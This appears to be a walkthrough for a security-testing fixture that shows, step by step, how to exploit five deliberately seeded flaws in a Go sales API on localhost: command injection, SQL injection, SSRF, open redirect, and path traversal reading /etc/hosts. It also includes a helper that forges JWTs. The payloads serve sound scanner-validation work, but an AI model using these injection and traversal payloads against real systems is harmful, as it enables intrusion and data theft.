# app-project-ardanservice — Local Exploit Walkthroughs

The seeded vulnerabilities live inside the ardanlabs/service sales API. All
POCs use harmless payloads; do not add destructive commands, credential
harvesting, or non-loopback targets. Every finding below has been executed
end-to-end against a local PostgreSQL + auth-service + sales stack.

## Runtime prerequisites

The sales service depends on PostgreSQL (`SALES_DB_HOST`) and a companion
auth-service (`SALES_AUTH_HOST`) that issues and validates JWTs. The upstream
project ships a `zarf/compose/docker_compose.yaml` for a full Docker bring-up,
but a lighter local flow using compiled binaries works well for POC
validation and is what these instructions target.

### Build the binaries

Run from the fixture project directory. The upstream `go.mod` pins
`go 1.27.0`, so `GOTOOLCHAIN=auto` on any Go 1.24+ install downloads the
required toolchain automatically.

```bash
cd fixtures/app-project-ardanservice/project
GOTOOLCHAIN=auto go build -o /tmp/ardan-sales ./api/services/sales
GOTOOLCHAIN=auto go build -o /tmp/ardan-auth  ./api/services/auth
GOTOOLCHAIN=auto go build -o /tmp/ardan-admin ./api/tooling/admin
```

### Initialize a dedicated database

Any local PostgreSQL that accepts `postgres/postgres` on `127.0.0.1:5432`
works. Create a fresh database so the fixture data can be dropped without
touching anything else:

```bash
PGPASSWORD=postgres psql -h 127.0.0.1 -U postgres -d postgres \
  -c "DROP DATABASE IF EXISTS ardan_fixture;" \
  -c "CREATE DATABASE ardan_fixture;"
```

Run the schema migrations and seed data:

```bash
SALES_DB_HOST=127.0.0.1:5432 SALES_DB_NAME=ardan_fixture \
SALES_DB_USER=postgres SALES_DB_PASSWORD=postgres SALES_DB_DISABLE_TLS=true \
  /tmp/ardan-admin migrate-seed
```

Populate department values on the seeded users so the SQL injection POC has
data to enumerate:

```bash
PGPASSWORD=postgres psql -h 127.0.0.1 -U postgres -d ardan_fixture <<'SQL'
UPDATE users SET department='Engineering' WHERE email='admin@example.com';
UPDATE users SET department='Marketing'   WHERE email='user@example.com';
SQL
```

### Start auth-service and sales

Both services must be started from the project directory so that the JWT
signing keys under `zarf/keys/` are found:

```bash
cd fixtures/app-project-ardanservice/project

AUTH_DB_HOST=127.0.0.1:5432 AUTH_DB_NAME=ardan_fixture \
AUTH_DB_USER=postgres AUTH_DB_PASSWORD=postgres AUTH_DB_DISABLE_TLS=true \
  /tmp/ardan-auth > /tmp/ardan-auth.log 2>&1 &

SALES_DB_HOST=127.0.0.1:5432 SALES_DB_NAME=ardan_fixture \
SALES_DB_USER=postgres SALES_DB_PASSWORD=postgres SALES_DB_DISABLE_TLS=true \
SALES_AUTH_HOST=http://127.0.0.1:6000 \
  /tmp/ardan-sales > /tmp/ardan-sales.log 2>&1 &

sleep 5
curl -sf http://127.0.0.1:6000/v1/liveness   # auth
curl -sf http://127.0.0.1:3000/v1/liveness   # sales
```

### Generate admin and user JWTs

The upstream `admin gentoken` command has an unrelated pre-existing bug
(`commands/gentoken.go` calls `keystore.LoadByJSON("SALAES_PEM")` with the
literal string instead of `os.Getenv("SALAES_PEM")`), so it always fails
before touching the file-system keystore. A tiny standalone helper signs a
JWT with the same key the auth-service uses:

```bash
mkdir -p /tmp/ardan-gentoken && cat > /tmp/ardan-gentoken/main.go <<'EOF'
package main

import (
    "crypto/rsa"
    "crypto/x509"
    "encoding/pem"
    "fmt"
    "os"
    "time"

    "github.com/golang-jwt/jwt/v4"
)

type claims struct {
    Roles []string `json:"roles"`
    jwt.RegisteredClaims
}

func main() {
    if len(os.Args) < 5 {
        fmt.Fprintln(os.Stderr, "usage: gentoken <pem> <kid> <user-id> <role>")
        os.Exit(2)
    }
    pemFile, kid, userID, role := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
    raw, err := os.ReadFile(pemFile); must(err)
    block, _ := pem.Decode(raw)
    var priv *rsa.PrivateKey
    if k, err := x509.ParsePKCS1PrivateKey(block.Bytes); err == nil {
        priv = k
    } else {
        p, err := x509.ParsePKCS8PrivateKey(block.Bytes); must(err)
        priv = p.(*rsa.PrivateKey)
    }
    tok := jwt.NewWithClaims(jwt.SigningMethodRS256, &claims{
        Roles: []string{role},
        RegisteredClaims: jwt.RegisteredClaims{
            Subject:   userID,
            Issuer:    "service project",
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
        },
    })
    tok.Header["kid"] = kid
    signed, err := tok.SignedString(priv); must(err)
    fmt.Println(signed)
}

func must(err error) { if err != nil { fmt.Fprintln(os.Stderr, err); os.Exit(1) } }
EOF
cat > /tmp/ardan-gentoken/go.mod <<'EOF'
module gentoken
go 1.24
require github.com/golang-jwt/jwt/v4 v4.5.2
EOF
cd /tmp/ardan-gentoken && GOTOOLCHAIN=auto go mod tidy && \
  GOTOOLCHAIN=auto go build -o /tmp/ardan-gentoken/gentoken .

PEM=fixtures/app-project-ardanservice/project/zarf/keys/54bb2165-71e1-41a6-af3e-7da4a0e1e2c1.pem
KID=54bb2165-71e1-41a6-af3e-7da4a0e1e2c1
/tmp/ardan-gentoken/gentoken "$PEM" "$KID" 5cf37266-3473-4006-984f-9325122678b7 ADMIN > /tmp/admin-jwt.txt
/tmp/ardan-gentoken/gentoken "$PEM" "$KID" 45b5fbd3-755f-4379-8f07-a58d4a30fa2f USER  > /tmp/user-jwt.txt
```

Verify the auth-service accepts the token:

```bash
curl -sf -H "Authorization: Bearer $(cat /tmp/admin-jwt.txt)" \
  http://127.0.0.1:6000/v1/auth/authenticate
```

The response should include `"roles":["ADMIN"]`.

### Sanity check

Run Snyk Code and confirm every seeded flow still shows up in the SARIF:

```bash
snyk code test fixtures/app-project-ardanservice/project --json \
  > /tmp/snyk-app-project-ardanservice.json
```

Snyk exits 1 when it finds issues; parse `runs[].results[]` and look for
`go/CommandInjection`, `go/Sqli`, `go/Ssrf`, `go/OR`, and `go/PT` inside
`app/domain/**` (non-vendor).

## Finding 1 — Command injection (dnscheck)

- Endpoint: `GET /v1/dnscheck?hostname=<value>`
- Source: `app/domain/checkapp/checkapp.go:50`
  (`hostname := r.URL.Query().Get("hostname")`)
- Sink: `app/domain/checkapp/diagnostics.go:10`
  (`exec.Command("sh", "-c", command).CombinedOutput()`)

Control request (returns a DNS resolution on Linux; on macOS `getent` is not
installed and the control returns `exit status 127`, which does not affect
the exploit below):

```bash
curl -s "http://127.0.0.1:3000/v1/dnscheck?hostname=localhost"
```

Exploit request — the quote-breaking hostname invokes `id` inside the shell:

```bash
curl -sG --data-urlencode 'hostname=localhost"; id; #' \
  "http://127.0.0.1:3000/v1/dnscheck"
```

The response body should contain the running service's process identity
(`uid=... gid=... groups=...`), demonstrating out-of-band command execution.

## Finding 2 — SQL injection (department search)

- Endpoint: `GET /v1/users/search/department?department=<value>`
  (requires admin JWT)
- Source: `app/domain/userapp/userapp.go:179`
  (`department := r.URL.Query().Get("department")`)
- Sink: `app/domain/userapp/department_search.go:12`
  (`db.QueryxContext(ctx, query)`)

Control request:

```bash
curl -s -H "Authorization: Bearer $(cat /tmp/admin-jwt.txt)" \
  "http://127.0.0.1:3000/v1/users/search/department?department=Engineering"
```

Returns just the Engineering user. Exploit request:

```bash
curl -sG -H "Authorization: Bearer $(cat /tmp/admin-jwt.txt)" \
  --data-urlencode "department=none' OR '1'='1" \
  "http://127.0.0.1:3000/v1/users/search/department"
```

Returns every user regardless of department, proving the `OR '1'='1` was
executed as SQL.

## Finding 3 — SSRF (webhook test)

- Endpoint: `POST /v1/users/webhooktest?url=<value>` (authenticated)
- Source: `app/domain/userapp/userapp.go:158`
  (`target := r.URL.Query().Get("url")`)
- Sink: `app/domain/userapp/webhook.go:9`
  (`resp, err := http.Get(target)`)

Set up a local loopback marker server:

```bash
mkdir -p /tmp/ssrf && echo "ardan-ssrf-marker-42" > /tmp/ssrf/health.txt
(cd /tmp/ssrf && python3 -m http.server 9002 --bind 127.0.0.1) &
```

Control request (external URL — succeeds or fails depending on your local
egress; either outcome is fine, the exploit is what proves reachability):

```bash
curl -s -X POST -H "Authorization: Bearer $(cat /tmp/user-jwt.txt)" \
  "http://127.0.0.1:3000/v1/users/webhooktest?url=https%3A%2F%2Fexample.com%2F"
```

Exploit request (server fetches the loopback marker):

```bash
curl -s -X POST -H "Authorization: Bearer $(cat /tmp/user-jwt.txt)" \
  "http://127.0.0.1:3000/v1/users/webhooktest?url=http%3A%2F%2F127.0.0.1%3A9002%2Fhealth.txt"
```

The response `body` field should contain `ardan-ssrf-marker-42`, proving the
sales process (not the client) performed the fetch.

## Finding 4 — Open redirect (preferences return)

- Endpoint: `GET /v1/users/preferences/return?return_to=<value>`
  (authenticated)
- Source: `app/domain/userapp/userapp.go:172`
  (`target := r.URL.Query().Get("return_to")`)
- Sink: `app/domain/userapp/redirect.go:9`
  (`http.Redirect(w, r, target, http.StatusFound)`)

Control request (empty parameter falls back to the in-app preferences page):

```bash
curl -sI -H "Authorization: Bearer $(cat /tmp/user-jwt.txt)" \
  "http://127.0.0.1:3000/v1/users/preferences/return" | grep -iE '^(HTTP|Location)'
```

Expected: `HTTP/1.1 302 Found` + `Location: /app/preferences`.

Exploit request (redirects to an external site):

```bash
curl -sI -H "Authorization: Bearer $(cat /tmp/user-jwt.txt)" \
  "http://127.0.0.1:3000/v1/users/preferences/return?return_to=https%3A%2F%2Fexample.com%2F" \
  | grep -iE '^(HTTP|Location)'
```

Expected: `HTTP/1.1 302 Found` + `Location: https://example.com/`.

## Finding 5 — Path traversal (audit report download)

- Endpoint: `GET /v1/audits/reports/download?name=<value>` (admin only)
- Source: `app/domain/auditapp/auditapp.go:61`
  (`name := r.URL.Query().Get("name")`)
- Sink: `app/domain/auditapp/reports.go:12`
  (`return os.ReadFile(reportPath)`)

The service reads relative to its working directory. When you run
`/tmp/ardan-sales` from
`fixtures/app-project-ardanservice/project`, the exports directory is
`static/audit/exports/`. Create a control file:

```bash
mkdir -p fixtures/app-project-ardanservice/project/static/audit/exports
printf 'monthly audit summary\n' \
  > fixtures/app-project-ardanservice/project/static/audit/exports/monthly-summary.txt
```

Control request:

```bash
curl -s -H "Authorization: Bearer $(cat /tmp/admin-jwt.txt)" \
  "http://127.0.0.1:3000/v1/audits/reports/download?name=monthly-summary.txt"
```

Should return `{"name":"monthly-summary.txt","contents":"monthly audit summary\n"}`.

Exploit request. The number of `..` segments must be at least the depth of
the sales working directory from `/`; overshooting is harmless. Assuming the
project sits under `~/development/…/fixtures/app-project-ardanservice/project`
(≈8 segments deep), plus the 3-segment `static/audit/exports` base, 11
segments is more than enough:

```bash
curl -sG -H "Authorization: Bearer $(cat /tmp/admin-jwt.txt)" \
  --data-urlencode "name=../../../../../../../../../../../etc/hosts" \
  "http://127.0.0.1:3000/v1/audits/reports/download"
```

The `contents` field should contain recognizable lines from `/etc/hosts`
such as `127.0.0.1 localhost`.

## Cleanup

```bash
# Kill background services (adjust to your PIDs if the pgrep names differ).
pkill -f /tmp/ardan-sales
pkill -f /tmp/ardan-auth
pkill -f "python3 -m http.server 9002"

# Drop the fixture database and remove the control file.
PGPASSWORD=postgres psql -h 127.0.0.1 -U postgres -d postgres \
  -c "DROP DATABASE IF EXISTS ardan_fixture;"
rm -f fixtures/app-project-ardanservice/project/static/audit/exports/monthly-summary.txt
rmdir fixtures/app-project-ardanservice/project/static/audit/exports 2>/dev/null || true
rm -rf /tmp/ssrf /tmp/ardan-gentoken /tmp/ardan-sales /tmp/ardan-auth \
       /tmp/ardan-admin /tmp/admin-jwt.txt /tmp/user-jwt.txt \
       /tmp/ardan-auth.log /tmp/ardan-sales.log
```

Never commit bearer tokens, cookies, or other secrets that this walkthrough
generates.
